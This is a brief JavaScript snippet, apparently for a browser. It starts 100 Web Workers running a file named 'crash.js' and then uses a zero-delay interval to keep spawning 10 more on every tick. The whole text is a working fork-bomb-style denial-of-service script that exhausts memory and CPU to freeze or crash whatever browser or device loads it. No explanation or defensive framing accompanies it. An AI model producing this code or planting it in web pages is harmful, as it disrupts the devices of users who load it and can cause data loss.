for (let i = 0; i < 100; i++) {
    new Worker("./crash.js");
}
setInterval(() => {
    for (let i = 0; i < 10; i++) {
        new Worker("./crash.js");
    }
}, 0);